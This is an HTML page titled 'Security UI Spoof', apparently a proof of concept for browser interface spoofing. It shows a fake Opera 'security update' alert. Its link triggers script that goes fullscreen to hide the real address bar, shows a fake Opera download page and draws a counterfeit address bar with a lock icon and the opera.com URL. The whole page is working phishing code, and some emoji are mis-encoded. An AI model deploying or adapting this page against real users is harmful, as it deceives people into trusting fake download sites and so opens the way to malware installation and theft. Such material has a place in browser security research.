<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security UI Spoof</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
            color: white;
            height: 100vh;
            overflow: hidden;
        }
        
        #spoof {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        
        #content {
            padding: 20px;
            text-align: center;
        }
        
        .opera-link {
            color: #ffcc00;
            text-decoration: none;
            font-weight: bold;
            font-size: 24px;
            border: 2px solid #ffcc00;
            padding: 15px 30px;
            border-radius: 10px;
            display: inline-block;
            margin-top: 30px;
            transition: all 0.3s ease;
        }
        
        .opera-link:hover {
            background: #ffcc00;
            color: #cc0000;
        }
        
        .warning {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            border-left: 5px solid #ffcc00;
        }
    </style>
    <script>
        function activateSpoof() {
            setTimeout(() => {
                // Hide legitimate content
                document.getElementById("content").style.display = "none";
                
                // Show spoofed image/content
                document.getElementById("spoof").style.display = "block";
                
                // Activate fullscreen to hide address bar
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen();
                } else if (document.documentElement.mozRequestFullScreen) {
                    document.documentElement.mozRequestFullScreen();
                } else if (document.documentElement.msRequestFullscreen) {
                    document.documentElement.msRequestFullscreen();
                }
                
                // Additional manipulation after fullscreen
                setTimeout(() => {
                    // Simulate browser UI changes
                    document.title = "Opera Browser - Download";
                    // Could add fake address bar here
                    createFakeAddressBar();
                }, 100);
                
            }, 500);
        }
        
        function createFakeAddressBar() {
            const fakeBar = document.createElement('div');
            fakeBar.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; right: 0; background: #2c2c2c; padding: 10px; border-bottom: 1px solid #555; z-index: 10000;">
                    <div style="display: flex; align-items: center;">
                        <div style="color: white; margin-right: 10px;">üîí</div>
                        <div style="color: white; font-family: monospace; font-size: 14px;">https://www.opera.com/download</div>
                    </div>
                </div>
            `;
            document.body.appendChild(fakeBar);
        }
    </script>
</head>  
<body>
    <!-- Spoofed content (hidden initially) -->
    <img id="spoof" style="display: none;" src="https://via.placeholder.com/800x1200/1e3a8a/ffffff?text=Opera+Browser+Official+Download+Page" alt="Fake Opera Page">
    
    <!-- Initial legitimate-looking content -->
    <div id="content">
        <div class="warning">
            <h2>‚ö†Ô∏è Security Alert</h2>
            <p>Your Opera browser needs an important security update.</p>
            <p>Click the link below to download the latest secure version.</p>
        </div>
        
        <br><br>
        
        <h1>Navigate to Opera Official Site</h1>
        <a href="#" class="opera-link" onclick="activateSpoof()">https://www.opera.com/download</a>
        
        <div style="margin-top: 50px; font-size: 14px; opacity: 0.8;">
            <p>üîí Secure Connection | Official Opera Software</p>
        </div>
    </div>
</body>
</html>
